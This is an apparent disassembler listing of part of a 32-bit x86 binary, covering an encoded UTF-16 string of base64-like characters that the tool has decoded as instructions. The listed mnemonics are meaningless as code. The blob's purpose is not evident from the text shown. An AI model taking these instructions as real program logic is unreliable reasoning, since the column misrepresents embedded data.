  40b094:	00 66 00             	add    %ah,0x0(%esi)
  40b097:	41                   	inc    %ecx
  40b098:	00 67 00             	add    %ah,0x0(%edi)
  40b09b:	30 00                	xor    %al,(%eax)
  40b09d:	59                   	pop    %ecx
  40b09e:	00 6a 00             	add    %ch,0x0(%edx)
  40b0a1:	31 00                	xor    %eax,(%eax)
  40b0a3:	66 00 38             	data16 add %bh,(%eax)
  40b0a6:	00 49 00             	add    %cl,0x0(%ecx)
  40b0a9:	54                   	push   %esp
  40b0aa:	00 56 00             	add    %dl,0x0(%esi)
  40b0ad:	57                   	push   %edi
  40b0ae:	00 36                	add    %dh,(%esi)
  40b0b0:	00 42 00             	add    %al,0x0(%edx)
  40b0b3:	37                   	aaa
  40b0b4:	00 56 00             	add    %dl,0x0(%esi)
  40b0b7:	54                   	push   %esp
  40b0b8:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0bb:	4f                   	dec    %edi
  40b0bc:	00 2b                	add    %ch,(%ebx)
  40b0be:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40b0c2:	00 53 00             	add    %dl,0x0(%ebx)
  40b0c5:	75 00                	jne    0x40b0c7
  40b0c7:	50                   	push   %eax
  40b0c8:	00 56 00             	add    %dl,0x0(%esi)
  40b0cb:	41                   	inc    %ecx
  40b0cc:	00 49 00             	add    %cl,0x0(%ecx)
  40b0cf:	71 00                	jno    0x40b0d1
  40b0d1:	46                   	inc    %esi
  40b0d2:	00 51 00             	add    %dl,0x0(%ecx)
  40b0d5:	62 00                	bound  %eax,(%eax)
  40b0d7:	31 00                	xor    %eax,(%eax)
  40b0d9:	68 00 38 00 78       	push   $0x78003800
  40b0de:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40b0e2:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0e5:	70 00                	jo     0x40b0e7
  40b0e7:	43                   	inc    %ebx
  40b0e8:	00 50 00             	add    %dl,0x0(%eax)
  40b0eb:	78 00                	js     0x40b0ed
  40b0ed:	59                   	pop    %ecx
  40b0ee:	00 71 00             	add    %dh,0x0(%ecx)
  40b0f1:	35 00 51 00 30       	xor    $0x30005100,%eax
  40b0f6:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0f9:	51                   	push   %ecx
  40b0fa:	00 38                	add    %bh,(%eax)
  40b0fc:	00 45 00             	add    %al,0x0(%ebp)
  40b0ff:	76 00                	jbe    0x40b101
  40b101:	6f                   	outsl  %ds:(%esi),(%dx)
  40b102:	00 49 00             	add    %cl,0x0(%ecx)
  40b105:	30 00                	xor    %al,(%eax)
  40b107:	76 00                	jbe    0x40b109
  40b109:	51                   	push   %ecx
  40b10a:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40b10e:	00 51 00             	add    %dl,0x0(%ecx)
  40b111:	31 00                	xor    %eax,(%eax)
  40b113:	4a                   	dec    %edx
  40b114:	00 68 00             	add    %ch,0x0(%eax)
  40b117:	47                   	inc    %edi
  40b118:	00 6d 00             	add    %ch,0x0(%ebp)
  40b11b:	78 00                	js     0x40b11d
  40b11d:	43                   	inc    %ebx
  40b11e:	00 57 00             	add    %dl,0x0(%edi)
  40b121:	76 00                	jbe    0x40b123
  40b123:	76 00                	jbe    0x40b125
  40b125:	6d                   	insl   (%dx),%es:(%edi)
  40b126:	00 49 00             	add    %cl,0x0(%ecx)
  40b129:	72 00                	jb     0x40b12b
  40b12b:	55                   	push   %ebp
  40b12c:	00 70 00             	add    %dh,0x0(%eax)
  40b12f:	4f                   	dec    %edi
  40b130:	00 35 00 69 00 51    	add    %dh,0x51006900
  40b136:	00 62 00             	add    %ah,0x0(%edx)
  40b139:	71 00                	jno    0x40b13b
  40b13b:	56                   	push   %esi
  40b13c:	00 35 00 49 00 58    	add    %dh,0x58004900
  40b142:	00 37                	add    %dh,(%edi)
  40b144:	00 65 00             	add    %ah,0x0(%ebp)
  40b147:	63 00                	arpl   %eax,(%eax)
  40b149:	79 00                	jns    0x40b14b
  40b14b:	70 00                	jo     0x40b14d
  40b14d:	4e                   	dec    %esi
  40b14e:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40b152:	00 6e 00             	add    %ch,0x0(%esi)
  40b155:	4e                   	dec    %esi
  40b156:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b15a:	00 41 00             	add    %al,0x0(%ecx)
  40b15d:	4a                   	dec    %edx
  40b15e:	00 46 00             	add    %al,0x0(%esi)
  40b161:	79 00                	jns    0x40b163
  40b163:	4b                   	dec    %ebx
  40b164:	00 49 00             	add    %cl,0x0(%ecx)
  40b167:	4d                   	dec    %ebp
  40b168:	00 2f                	add    %ch,(%edi)
  40b16a:	00 43 00             	add    %al,0x0(%ebx)
  40b16d:	46                   	inc    %esi
  40b16e:	00 2f                	add    %ch,(%edi)
  40b170:	00 73 00             	add    %dh,0x0(%ebx)
  40b173:	76 00                	jbe    0x40b175
  40b175:	58                   	pop    %eax
  40b176:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40b17a:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40b17e:	00 48 00             	add    %cl,0x0(%eax)
  40b181:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b185:	49                   	dec    %ecx
  40b186:	00 49 00             	add    %cl,0x0(%ecx)
  40b189:	54                   	push   %esp
  40b18a:	00 70 00             	add    %dh,0x0(%eax)
  40b18d:	47                   	inc    %edi
  40b18e:	00 46 00             	add    %al,0x0(%esi)
  40b191:	67 00 36 00 78       	add    %dh,0x7800
  40b196:	00 63 00             	add    %ah,0x0(%ebx)
  40b199:	35 00 46 00 4e       	xor    $0x4e004600,%eax
  40b19e:	00 56 00             	add    %dl,0x0(%esi)
  40b1a1:	43                   	inc    %ebx
  40b1a2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1a5:	59                   	pop    %ecx
  40b1a6:	00 68 00             	add    %ch,0x0(%eax)
  40b1a9:	38 00                	cmp    %al,(%eax)
  40b1ab:	73 00                	jae    0x40b1ad
  40b1ad:	30 00                	xor    %al,(%eax)
  40b1af:	78 00                	js     0x40b1b1
  40b1b1:	63 00                	arpl   %eax,(%eax)
  40b1b3:	4c                   	dec    %esp
  40b1b4:	00 50 00             	add    %dl,0x0(%eax)
  40b1b7:	4f                   	dec    %edi
  40b1b8:	00 47 00             	add    %al,0x0(%edi)
  40b1bb:	62 00                	bound  %eax,(%eax)
  40b1bd:	56                   	push   %esi
  40b1be:	00 70 00             	add    %dh,0x0(%eax)
  40b1c1:	72 00                	jb     0x40b1c3
  40b1c3:	32 00                	xor    (%eax),%al
  40b1c5:	63 00                	arpl   %eax,(%eax)
  40b1c7:	6a 00                	push   $0x0
  40b1c9:	59                   	pop    %ecx
  40b1ca:	00 67 00             	add    %ah,0x0(%edi)
  40b1cd:	6d                   	insl   (%dx),%es:(%edi)
  40b1ce:	00 65 00             	add    %ah,0x0(%ebp)
  40b1d1:	58                   	pop    %eax
  40b1d2:	00 53 00             	add    %dl,0x0(%ebx)
  40b1d5:	45                   	inc    %ebp
  40b1d6:	00 4f 00             	add    %cl,0x0(%edi)
  40b1d9:	69 00 4f 00 38 00    	imul   $0x38004f,(%eax),%eax
  40b1df:	2b 00                	sub    (%eax),%eax
  40b1e1:	2b 00                	sub    (%eax),%eax
  40b1e3:	45                   	inc    %ebp
  40b1e4:	00 68 00             	add    %ch,0x0(%eax)
  40b1e7:	78 00                	js     0x40b1e9
  40b1e9:	31 00                	xor    %eax,(%eax)
  40b1eb:	34 00                	xor    $0x0,%al
  40b1ed:	56                   	push   %esi
  40b1ee:	00 76 00             	add    %dh,0x0(%esi)
  40b1f1:	46                   	inc    %esi
  40b1f2:	00 35 00 74 00 34    	add    %dh,0x34007400
  40b1f8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1fb:	41                   	inc    %ecx
  40b1fc:	00 6f 00             	add    %ch,0x0(%edi)
  40b1ff:	4c                   	dec    %esp
  40b200:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40b204:	00 39                	add    %bh,(%ecx)
  40b206:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40b20a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b20d:	32 00                	xor    (%eax),%al
  40b20f:	30 00                	xor    %al,(%eax)
  40b211:	33 00                	xor    (%eax),%eax
  40b213:	35 00 47 00 73       	xor    $0x73004700,%eax
  40b218:	00 58 00             	add    %bl,0x0(%eax)
  40b21b:	63 00                	arpl   %eax,(%eax)
  40b21d:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40b221:	74 00                	je     0x40b223
  40b223:	58                   	pop    %eax
  40b224:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b228:	00 43 00             	add    %al,0x0(%ebx)
  40b22b:	39 00                	cmp    %eax,(%eax)
  40b22d:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40b231:	6f                   	outsl  %ds:(%esi),(%dx)
  40b232:	00 51 00             	add    %dl,0x0(%ecx)
  40b235:	54                   	push   %esp
  40b236:	00 53 00             	add    %dl,0x0(%ebx)
  40b239:	52                   	push   %edx
  40b23a:	00 61 00             	add    %ah,0x0(%ecx)
  40b23d:	2b 00                	sub    (%eax),%eax
  40b23f:	31 00                	xor    %eax,(%eax)
  40b241:	70 00                	jo     0x40b243
  40b243:	54                   	push   %esp
  40b244:	00 39                	add    %bh,(%ecx)
  40b246:	00 39                	add    %bh,(%ecx)
  40b248:	00 4e 00             	add    %cl,0x0(%esi)
  40b24b:	7a 00                	jp     0x40b24d
  40b24d:	72 00                	jb     0x40b24f
  40b24f:	45                   	inc    %ebp
  40b250:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40b254:	00 5a 00             	add    %bl,0x0(%edx)
  40b257:	77 00                	ja     0x40b259
  40b259:	36 00 30             	add    %dh,%ss:(%eax)
  40b25c:	00 68 00             	add    %ch,0x0(%eax)
  40b25f:	54                   	push   %esp
  40b260:	00 72 00             	add    %dh,0x0(%edx)
  40b263:	52                   	push   %edx
  40b264:	00 30                	add    %dh,(%eax)
  40b266:	00 31                	add    %dh,(%ecx)
  40b268:	00 32                	add    %dh,(%edx)
  40b26a:	00 56 00             	add    %dl,0x0(%esi)
  40b26d:	77 00                	ja     0x40b26f
  40b26f:	74 00                	je     0x40b271
  40b271:	5a                   	pop    %edx
  40b272:	00 39                	add    %bh,(%ecx)
  40b274:	00 46 00             	add    %al,0x0(%esi)
  40b277:	33 00                	xor    (%eax),%eax
  40b279:	57                   	push   %edi
  40b27a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b27d:	7a 00                	jp     0x40b27f
  40b27f:	59                   	pop    %ecx
  40b280:	00 72 00             	add    %dh,0x0(%edx)
  40b283:	7a 00                	jp     0x40b285
  40b285:	54                   	push   %esp
  40b286:	00 4b 00             	add    %cl,0x0(%ebx)
  40b289:	63 00                	arpl   %eax,(%eax)
  40b28b:	53                   	push   %ebx
  40b28c:	00 56 00             	add    %dl,0x0(%esi)
  40b28f:	5a                   	pop    %edx
  40b290:	00 37                	add    %dh,(%edi)
  40b292:	00 41 00             	add    %al,0x0(%ecx)
  40b295:	58                   	pop    %eax
  40b296:	00 30                	add    %dh,(%eax)
  40b298:	00 39                	add    %bh,(%ecx)
  40b29a:	00 42 00             	add    %al,0x0(%edx)
  40b29d:	5a                   	pop    %edx
  40b29e:	00 6a 00             	add    %ch,0x0(%edx)
  40b2a1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2a2:	00 50 00             	add    %dl,0x0(%eax)
  40b2a5:	32 00                	xor    (%eax),%al
  40b2a7:	54                   	push   %esp
  40b2a8:	00 72 00             	add    %dh,0x0(%edx)
  40b2ab:	56                   	push   %esi
  40b2ac:	00 61 00             	add    %ah,0x0(%ecx)
  40b2af:	46                   	inc    %esi
  40b2b0:	00 6e 00             	add    %ch,0x0(%esi)
  40b2b3:	35 00 4b 00 37       	xor    $0x37004b00,%eax
  40b2b8:	00 55 00             	add    %dl,0x0(%ebp)
  40b2bb:	6a 00                	push   $0x0
  40b2bd:	52                   	push   %edx
  40b2be:	00 69 00             	add    %ch,0x0(%ecx)
  40b2c1:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40b2c5:	31 00                	xor    %eax,(%eax)
  40b2c7:	4b                   	dec    %ebx
  40b2c8:	00 49 00             	add    %cl,0x0(%ecx)
  40b2cb:	6d                   	insl   (%dx),%es:(%edi)
  40b2cc:	00 36                	add    %dh,(%esi)
  40b2ce:	00 39                	add    %bh,(%ecx)
  40b2d0:	00 62 00             	add    %ah,0x0(%edx)
  40b2d3:	53                   	push   %ebx
  40b2d4:	00 48 00             	add    %cl,0x0(%eax)
  40b2d7:	6d                   	insl   (%dx),%es:(%edi)
  40b2d8:	00 37                	add    %dh,(%edi)
  40b2da:	00 39                	add    %bh,(%ecx)
  40b2dc:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40b2e0:	00 72 00             	add    %dh,0x0(%edx)
  40b2e3:	57                   	push   %edi
  40b2e4:	00 76 00             	add    %dh,0x0(%esi)
  40b2e7:	39 00                	cmp    %eax,(%eax)
  40b2e9:	44                   	inc    %esp
  40b2ea:	00 52 00             	add    %dl,0x0(%edx)
  40b2ed:	67 00 65 00          	add    %ah,0x0(%di)
  40b2f1:	4e                   	dec    %esi
  40b2f2:	00 69 00             	add    %ch,0x0(%ecx)
  40b2f5:	46                   	inc    %esi
  40b2f6:	00 66 00             	add    %ah,0x0(%esi)
  40b2f9:	64 00 37             	add    %dh,%fs:(%edi)
  40b2fc:	00 32                	add    %dh,(%edx)
  40b2fe:	00 58 00             	add    %bl,0x0(%eax)
  40b301:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b305:	71 00                	jno    0x40b307
  40b307:	47                   	inc    %edi
  40b308:	00 69 00             	add    %ch,0x0(%ecx)
  40b30b:	52                   	push   %edx
  40b30c:	00 46 00             	add    %al,0x0(%esi)
  40b30f:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40b313:	7a 00                	jp     0x40b315
  40b315:	7a 00                	jp     0x40b317
  40b317:	43                   	inc    %ebx
  40b318:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b31c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b31f:	34 00                	xor    $0x0,%al
  40b321:	77 00                	ja     0x40b323
  40b323:	35 00 44 00 43       	xor    $0x43004400,%eax
  40b328:	00 79 00             	add    %bh,0x0(%ecx)
  40b32b:	47                   	inc    %edi
  40b32c:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40b330:	00 70 00             	add    %dh,0x0(%eax)
  40b333:	46                   	inc    %esi
  40b334:	00 4e 00             	add    %cl,0x0(%esi)
  40b337:	32 00                	xor    (%eax),%al
  40b339:	78 00                	js     0x40b33b
  40b33b:	69 00 79 00 6f 00    	imul   $0x6f0079,(%eax),%eax
  40b341:	6e                   	outsb  %ds:(%esi),(%dx)
  40b342:	00 76 00             	add    %dh,0x0(%esi)
  40b345:	31 00                	xor    %eax,(%eax)
  40b347:	73 00                	jae    0x40b349
  40b349:	45                   	inc    %ebp
  40b34a:	00 42 00             	add    %al,0x0(%edx)
  40b34d:	2b 00                	sub    (%eax),%eax
  40b34f:	30 00                	xor    %al,(%eax)
  40b351:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40b355:	76 00                	jbe    0x40b357
  40b357:	6b 00 48             	imul   $0x48,(%eax),%eax
  40b35a:	00 4d 00             	add    %cl,0x0(%ebp)
  40b35d:	41                   	inc    %ecx
  40b35e:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40b362:	00 33                	add    %dh,(%ebx)
  40b364:	00 49 00             	add    %cl,0x0(%ecx)
  40b367:	4c                   	dec    %esp
  40b368:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40b36c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b36f:	53                   	push   %ebx
  40b370:	00 7a 00             	add    %bh,0x0(%edx)
  40b373:	39 00                	cmp    %eax,(%eax)
  40b375:	6a 00                	push   $0x0
  40b377:	48                   	dec    %eax
  40b378:	00 69 00             	add    %ch,0x0(%ecx)
  40b37b:	50                   	push   %eax
  40b37c:	00 35 00 50 00 73    	add    %dh,0x73005000
  40b382:	00 70 00             	add    %dh,0x0(%eax)
  40b385:	53                   	push   %ebx
  40b386:	00 32                	add    %dh,(%edx)
  40b388:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40b38c:	00 7a 00             	add    %bh,0x0(%edx)
  40b38f:	47                   	inc    %edi
  40b390:	00 56 00             	add    %dl,0x0(%esi)
  40b393:	46                   	inc    %esi
  40b394:	00 46 00             	add    %al,0x0(%esi)
  40b397:	4d                   	dec    %ebp
  40b398:	00 67 00             	add    %ah,0x0(%edi)
  40b39b:	48                   	dec    %eax
  40b39c:	00 51 00             	add    %dl,0x0(%ecx)
  40b39f:	7a 00                	jp     0x40b3a1
  40b3a1:	4a                   	dec    %edx
  40b3a2:	00 7a 00             	add    %bh,0x0(%edx)
  40b3a5:	4b                   	dec    %ebx
  40b3a6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3a9:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40b3ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3ae:	00 49 00             	add    %cl,0x0(%ecx)
  40b3b1:	59                   	pop    %ecx
  40b3b2:	00 36                	add    %dh,(%esi)
  40b3b4:	00 4e 00             	add    %cl,0x0(%esi)
  40b3b7:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40b3bb:	56                   	push   %esi
  40b3bc:	00 51 00             	add    %dl,0x0(%ecx)
  40b3bf:	66 00 6c 00 38       	data16 add %ch,0x38(%eax,%eax,1)
  40b3c4:	00 5a 00             	add    %bl,0x0(%edx)
  40b3c7:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b3cb:	53                   	push   %ebx
  40b3cc:	00 5a 00             	add    %bl,0x0(%edx)
  40b3cf:	55                   	push   %ebp
  40b3d0:	00 50 00             	add    %dl,0x0(%eax)
  40b3d3:	4a                   	dec    %edx
  40b3d4:	00 63 00             	add    %ah,0x0(%ebx)
  40b3d7:	63 00                	arpl   %eax,(%eax)
  40b3d9:	33 00                	xor    (%eax),%eax
  40b3db:	78 00                	js     0x40b3dd
  40b3dd:	77 00                	ja     0x40b3df
  40b3df:	73 00                	jae    0x40b3e1
  40b3e1:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40b3e5:	70 00                	jo     0x40b3e7
  40b3e7:	47                   	inc    %edi
  40b3e8:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40b3ec:	00 55 00             	add    %dl,0x0(%ebp)
  40b3ef:	70 00                	jo     0x40b3f1
  40b3f1:	49                   	dec    %ecx
  40b3f2:	00 47 00             	add    %al,0x0(%edi)
  40b3f5:	4b                   	dec    %ebx
  40b3f6:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40b3fa:	00 49 00             	add    %cl,0x0(%ecx)
  40b3fd:	30 00                	xor    %al,(%eax)
  40b3ff:	5a                   	pop    %edx
  40b400:	00 6b 00             	add    %ch,0x0(%ebx)
  40b403:	58                   	pop    %eax
  40b404:	00 46 00             	add    %al,0x0(%esi)
  40b407:	39 00                	cmp    %eax,(%eax)
  40b409:	4c                   	dec    %esp
  40b40a:	00 31                	add    %dh,(%ecx)
  40b40c:	00 53 00             	add    %dl,0x0(%ebx)
  40b40f:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40b413:	32 00                	xor    (%eax),%al
  40b415:	4d                   	dec    %ebp
  40b416:	00 4e 00             	add    %cl,0x0(%esi)
  40b419:	62 00                	bound  %eax,(%eax)
  40b41b:	68 00 70 00 6f       	push   $0x6f007000
  40b420:	00 55 00             	add    %dl,0x0(%ebp)
  40b423:	39 00                	cmp    %eax,(%eax)
  40b425:	2b 00                	sub    (%eax),%eax
  40b427:	42                   	inc    %edx
  40b428:	00 78 00             	add    %bh,0x0(%eax)
  40b42b:	45                   	inc    %ebp
  40b42c:	00 32                	add    %dh,(%edx)
  40b42e:	00 4e 00             	add    %cl,0x0(%esi)
  40b431:	51                   	push   %ecx
  40b432:	00 6a 00             	add    %ch,0x0(%edx)
  40b435:	69 00 44 00 6a 00    	imul   $0x6a0044,(%eax),%eax
  40b43b:	43                   	inc    %ebx
  40b43c:	00 2b                	add    %ch,(%ebx)
  40b43e:	00 71 00             	add    %dh,0x0(%ecx)
  40b441:	48                   	dec    %eax
  40b442:	00 4a 00             	add    %cl,0x0(%edx)
  40b445:	4f                   	dec    %edi
  40b446:	00 75 00             	add    %dh,0x0(%ebp)
  40b449:	42                   	inc    %edx
  40b44a:	00 67 00             	add    %ah,0x0(%edi)
  40b44d:	46                   	inc    %esi
  40b44e:	00 69 00             	add    %ch,0x0(%ecx)
  40b451:	54                   	push   %esp
  40b452:	00 65 00             	add    %ah,0x0(%ebp)
  40b455:	59                   	pop    %ecx
  40b456:	00 58 00             	add    %bl,0x0(%eax)
  40b459:	31 00                	xor    %eax,(%eax)
  40b45b:	79 00                	jns    0x40b45d
  40b45d:	58                   	pop    %eax
  40b45e:	00 73 00             	add    %dh,0x0(%ebx)
  40b461:	57                   	push   %edi
  40b462:	00 42 00             	add    %al,0x0(%edx)
  40b465:	42                   	inc    %edx
  40b466:	00 4a 00             	add    %cl,0x0(%edx)
  40b469:	79 00                	jns    0x40b46b
  40b46b:	47                   	inc    %edi
  40b46c:	00 65 00             	add    %ah,0x0(%ebp)
  40b46f:	55                   	push   %ebp
  40b470:	00 51 00             	add    %dl,0x0(%ecx)
  40b473:	69 00 64 00 55 00    	imul   $0x550064,(%eax),%eax
  40b479:	5a                   	pop    %edx
  40b47a:	00 4e 00             	add    %cl,0x0(%esi)
  40b47d:	51                   	push   %ecx
  40b47e:	00 6f 00             	add    %ch,0x0(%edi)
  40b481:	43                   	inc    %ebx
  40b482:	00 38                	add    %bh,(%eax)
  40b484:	00 73 00             	add    %dh,0x0(%ebx)
  40b487:	33 00                	xor    (%eax),%eax
  40b489:	4f                   	dec    %edi
  40b48a:	00 4e 00             	add    %cl,0x0(%esi)
  40b48d:	74 00                	je     0x40b48f
  40b48f:	73 00                	jae    0x40b491
  40b491:	70 00                	jo     0x40b493
  40b493:	34 00                	xor    $0x0,%al
  40b495:	59                   	pop    %ecx
  40b496:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40b49a:	00 49 00             	add    %cl,0x0(%ecx)
  40b49d:	45                   	inc    %ebp
  40b49e:	00 42 00             	add    %al,0x0(%edx)
  40b4a1:	5a                   	pop    %edx
  40b4a2:	00 43 00             	add    %al,0x0(%ebx)
  40b4a5:	30 00                	xor    %al,(%eax)
  40b4a7:	6c                   	insb   (%dx),%es:(%edi)
  40b4a8:	00 76 00             	add    %dh,0x0(%esi)
  40b4ab:	7a 00                	jp     0x40b4ad
  40b4ad:	45                   	inc    %ebp
  40b4ae:	00 67 00             	add    %ah,0x0(%edi)
  40b4b1:	71 00                	jno    0x40b4b3
  40b4b3:	67 00 6d 00          	add    %ch,0x0(%di)
  40b4b7:	49                   	dec    %ecx
  40b4b8:	00 67 00             	add    %ah,0x0(%edi)
  40b4bb:	58                   	pop    %eax
  40b4bc:	00 73 00             	add    %dh,0x0(%ebx)
  40b4bf:	38 00                	cmp    %al,(%eax)
  40b4c1:	44                   	inc    %esp
  40b4c2:	00 55 00             	add    %dl,0x0(%ebp)
  40b4c5:	62 00                	bound  %eax,(%eax)
  40b4c7:	38 00                	cmp    %al,(%eax)
  40b4c9:	47                   	inc    %edi
  40b4ca:	00 4e 00             	add    %cl,0x0(%esi)
  40b4cd:	6a 00                	push   $0x0
  40b4cf:	2b 00                	sub    (%eax),%eax
  40b4d1:	57                   	push   %edi
  40b4d2:	00 32                	add    %dh,(%edx)
  40b4d4:	00 2f                	add    %ch,(%edi)
  40b4d6:	00 43 00             	add    %al,0x0(%ebx)
  40b4d9:	78 00                	js     0x40b4db
  40b4db:	70 00                	jo     0x40b4dd
  40b4dd:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40b4e1:	46                   	inc    %esi
  40b4e2:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40b4e6:	00 76 00             	add    %dh,0x0(%esi)
  40b4e9:	36 00 64 00 68       	add    %ah,%ss:0x68(%eax,%eax,1)
  40b4ee:	00 6e 00             	add    %ch,0x0(%esi)
  40b4f1:	77 00                	ja     0x40b4f3
  40b4f3:	55                   	push   %ebp
  40b4f4:	00 4f 00             	add    %cl,0x0(%edi)
  40b4f7:	51                   	push   %ecx
  40b4f8:	00 33                	add    %dh,(%ebx)
  40b4fa:	00 2f                	add    %ch,(%edi)
  40b4fc:	00 68 00             	add    %ch,0x0(%eax)
  40b4ff:	47                   	inc    %edi
  40b500:	00 48 00             	add    %cl,0x0(%eax)
  40b503:	30 00                	xor    %al,(%eax)
  40b505:	43                   	inc    %ebx
  40b506:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b509:	66 00 32             	data16 add %dh,(%edx)
  40b50c:	00 79 00             	add    %bh,0x0(%ecx)
  40b50f:	54                   	push   %esp
  40b510:	00 4b 00             	add    %cl,0x0(%ebx)
  40b513:	5a                   	pop    %edx
  40b514:	00 4a 00             	add    %cl,0x0(%edx)
  40b517:	35 00 59 00 78       	xor    $0x78005900,%eax
  40b51c:	00 75 00             	add    %dh,0x0(%ebp)
  40b51f:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40b523:	61                   	popa
  40b524:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40b528:	00 75 00             	add    %dh,0x0(%ebp)
  40b52b:	55                   	push   %ebp
  40b52c:	00 6e 00             	add    %ch,0x0(%esi)
  40b52f:	44                   	inc    %esp
  40b530:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40b534:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b538:	00 48 00             	add    %cl,0x0(%eax)
  40b53b:	4a                   	dec    %edx
  40b53c:	00 68 00             	add    %ch,0x0(%eax)
  40b53f:	51                   	push   %ecx
  40b540:	00 4f 00             	add    %cl,0x0(%edi)
  40b543:	42                   	inc    %edx
  40b544:	00 65 00             	add    %ah,0x0(%ebp)
  40b547:	32 00                	xor    (%eax),%al
  40b549:	4b                   	dec    %ebx
  40b54a:	00 53 00             	add    %dl,0x0(%ebx)
  40b54d:	6c                   	insb   (%dx),%es:(%edi)
  40b54e:	00 4e 00             	add    %cl,0x0(%esi)
  40b551:	69 00 4b 00 4f 00    	imul   $0x4f004b,(%eax),%eax
  40b557:	73 00                	jae    0x40b559
  40b559:	42                   	inc    %edx
  40b55a:	00 49 00             	add    %cl,0x0(%ecx)
  40b55d:	39 00                	cmp    %eax,(%eax)
  40b55f:	68 00 36 00 51       	push   $0x51003600
  40b564:	00 4f 00             	add    %cl,0x0(%edi)
  40b567:	54                   	push   %esp
  40b568:	00 6a 00             	add    %ch,0x0(%edx)
  40b56b:	76 00                	jbe    0x40b56d
  40b56d:	32 00                	xor    (%eax),%al
  40b56f:	58                   	pop    %eax
  40b570:	00 6d 00             	add    %ch,0x0(%ebp)
  40b573:	2f                   	das
  40b574:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40b578:	00 30                	add    %dh,(%eax)
  40b57a:	00 72 00             	add    %dh,0x0(%edx)
  40b57d:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b581:	59                   	pop    %ecx
  40b582:	00 61 00             	add    %ah,0x0(%ecx)
  40b585:	4b                   	dec    %ebx
  40b586:	00 77 00             	add    %dh,0x0(%edi)
  40b589:	6a 00                	push   $0x0
  40b58b:	75 00                	jne    0x40b58d
  40b58d:	47                   	inc    %edi
  40b58e:	00 63 00             	add    %ah,0x0(%ebx)
  40b591:	58                   	pop    %eax
  40b592:	00 31                	add    %dh,(%ecx)
  40b594:	00 50 00             	add    %dl,0x0(%eax)
  40b597:	48                   	dec    %eax
  40b598:	00 38                	add    %bh,(%eax)
  40b59a:	00 7a 00             	add    %bh,0x0(%edx)
  40b59d:	34 00                	xor    $0x0,%al
  40b59f:	77 00                	ja     0x40b5a1
  40b5a1:	48                   	dec    %eax
  40b5a2:	00 58 00             	add    %bl,0x0(%eax)
  40b5a5:	6d                   	insl   (%dx),%es:(%edi)
  40b5a6:	00 70 00             	add    %dh,0x0(%eax)
  40b5a9:	49                   	dec    %ecx
  40b5aa:	00 49 00             	add    %cl,0x0(%ecx)
  40b5ad:	41                   	inc    %ecx
  40b5ae:	00 39                	add    %bh,(%ecx)
  40b5b0:	00 79 00             	add    %bh,0x0(%ecx)
  40b5b3:	51                   	push   %ecx
  40b5b4:	00 41 00             	add    %al,0x0(%ecx)
  40b5b7:	6b 00 41             	imul   $0x41,(%eax),%eax
  40b5ba:	00 38                	add    %bh,(%eax)
  40b5bc:	00 70 00             	add    %dh,0x0(%eax)
  40b5bf:	37                   	aaa
  40b5c0:	00 7a 00             	add    %bh,0x0(%edx)
  40b5c3:	49                   	dec    %ecx
  40b5c4:	00 7a 00             	add    %bh,0x0(%edx)
  40b5c7:	4a                   	dec    %edx
  40b5c8:	00 49 00             	add    %cl,0x0(%ecx)
  40b5cb:	43                   	inc    %ebx
  40b5cc:	00 65 00             	add    %ah,0x0(%ebp)
  40b5cf:	69 00 63 00 4e 00    	imul   $0x4e0063,(%eax),%eax
  40b5d5:	2b 00                	sub    (%eax),%eax
  40b5d7:	4f                   	dec    %edi
  40b5d8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5db:	56                   	push   %esi
  40b5dc:	00 73 00             	add    %dh,0x0(%ebx)
